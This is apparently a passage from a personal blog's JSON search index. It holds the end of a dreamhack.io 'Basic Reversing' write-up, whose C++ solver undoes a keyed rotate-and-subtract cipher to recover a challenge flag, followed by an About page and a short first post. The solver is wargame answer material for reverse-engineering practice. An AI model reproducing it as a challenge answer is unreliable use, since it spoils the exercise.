0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x2, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0xc, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0xb, 0xdb, 0xe0, 0x32, 0x3a, 0xa, 0x49, 0x6, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x8, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x3, 0xf6, 0xe, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0xd, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0xf, 0xb0, 0x54, 0xbb, 0x16}; char v5[] = \"I_am_KEY\"; for (int pos = 0; pos \u003c 24; pos += 8) { uint8_t *a1 = flag + pos; for (int i = 0; i \u003c 16; ++i ) { for (int j = 7; j \u003e= 0; j-- ) { a1[(j + 1) \u0026 7] = __ROL1__(a1[(j + 1) \u0026 7], 5) - byte_140004020[v5[j] ^ a1[j \u0026 7]]; } } } cout \u003c\u003c flag \u003c\u003c '\\n'; } ","date":"2023-07-31","objectID":"/dreamhack-basic-rev/:6:0","tags":["reversing"],"title":"[dreamhack.io] Basic Reversing","uri":"/dreamhack-basic-rev/"},{"categories":null,"content":"Having a burning love for Elaina ﾉ*:･ﾟ✧ ","date":"2023-07-31","objectID":"/about/:0:0","tags":null,"title":"","uri":"/about/"},{"categories":null,"content":"Contact me: https://www.facebook.com/allforest01/ ","date":"2023-07-31","objectID":"/about/:0:1","tags":null,"title":"","uri":"/about/"},{"categories":null,"content":"Dreamhack: https://dreamhack.io/users/41917/ ","date":"2023-07-31","objectID":"/about/:0:2","tags":null,"title":"","uri":"/about/"},{"categories":null,"content":"Codeforces: https://codeforces.com/profile/PurpleWhale/ ","date":"2023-07-31","objectID":"/about/:0:3","tags":null,"title":"","uri":"/about/"},{"categories":[],"content":" Info I created this blog to write about anything I love in English, although my English is not very strong. Therefore, I will be using ChatGPT to help me improve my grammar. The subjects I can write about in the future include coding, reversing, pwning or writing novels, etc. Success I hope you are enjoying my blog! ","date":"2023-07-31","objectID":"/first-post/:0:0","tags":["blog"],"title":"This is my first post on my first blog","uri":"/first-post/"}]